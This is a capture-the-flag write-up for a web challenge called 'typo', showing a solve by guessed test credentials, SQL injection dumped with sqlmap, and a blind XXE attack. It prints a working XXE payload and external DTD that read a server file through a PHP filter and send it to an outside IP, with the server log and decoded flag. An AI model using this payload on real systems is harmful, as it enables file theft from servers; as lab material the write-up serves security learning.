# Challenge
I like to count in base 4 and not in base too, this is why this is hard

Look at my source code, as I am sure you can see my typo

[https://typhooncon-typo.chals.io/](https://typhooncon-typo.chals.io/)

Flag format: SSD{...}

 [typo_src.zip](https://typhooncon.ctfd.io/files/a97808e4dcbca3ef6d29e329c213fd5e/typo_src.zip?token=eyJ1c2VyX2lkIjo1MDcsInRlYW1faWQiOjQwOCwiZmlsZV9pZCI6M30.YrBT2A.cplyDzNsPh35P035avpCOrME31k)

## Solution \[rgolab\]
First part is guessing test:test credentials.
After code analyze we know the data.php?u= is SQLi vuln so we can easly dump DB via sqlmap
then we're able to crack admin password

POST data=
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://185.41.69.21:8181/file.dtd">%remote;%int;%trick;]>

<user><username>admin</username></user>


We have to create file.dtd which will be loaded from our server
<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/flag">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://185.41.69.21:8181/?p=%payl;'>">



$ python3 -m http.server 8181
Serving HTTP on 0.0.0.0 port 8181 ...
167.71.247.221 - - [20/Jun/2022 09:39:23] "GET /file.dtd HTTP/1.0" 200 -
167.71.247.221 - - [20/Jun/2022 09:39:23] "GET /?p=SSB3aXNoIGZsbGxsYWdnZ2dnIHdhcyBzcGVsbGxsbGxlZCB3aXRoIG11bHRwbGUgZ2dnZyBhbmQgbGxsbGwKU1NEezE5ZTAxNzY5ZjU2MjA3Y2I0NjIwMTczZjlhYTg3ODliYTViOWU3MWF9Cg== HTTP/1.0" 200 -


$ echo "SSB3aXNoIGZsbGxsYWdnZ2dnIHdhcyBzcGVsbGxsbGxlZCB3aXRoIG11bHRwbGUgZ2dnZyBhbmQgbGxsbGwKU1NEezE5ZTAxNzY5ZjU2MjA3Y2I0NjIwMTczZjlhYTg3ODliYTViOWU3MWF9Cg==" |base64 -d
I wish fllllaggggg was spelllllled with multple gggg and lllll
SSD{19e01769f56207cb4620173f9aa8789ba5b9e71a}


We have the flag: SSD{19e01769f56207cb4620173f9aa8789ba5b9e71a}

#xxe #blind #blindxxe #php #phpfilters